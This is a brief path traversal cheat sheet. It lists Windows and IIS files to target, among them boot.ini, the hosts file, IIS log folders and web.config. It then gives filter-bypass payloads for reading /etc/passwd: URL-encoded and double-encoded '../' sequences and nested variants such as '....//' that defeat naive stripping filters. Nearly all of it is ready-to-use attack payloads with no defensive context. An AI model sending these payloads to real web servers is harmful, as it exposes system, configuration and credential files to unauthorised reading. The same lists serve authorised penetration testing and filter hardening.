
# Windows: check important files
```bash
# path traversal test
C:\Windows\boot.ini
C:\Windows\System32\drivers\etc\hosts

# iis log paths 
C:\inetpub\logs\LogFiles\W3SVC1\

# iis web root structure
C:\inetpub\wwwroot\web.config
```

# bypass filters
```bash
# url encode
%2e%2e%2f

# double URL encode
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd



# Bypass "../" replaced by ""
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd



```
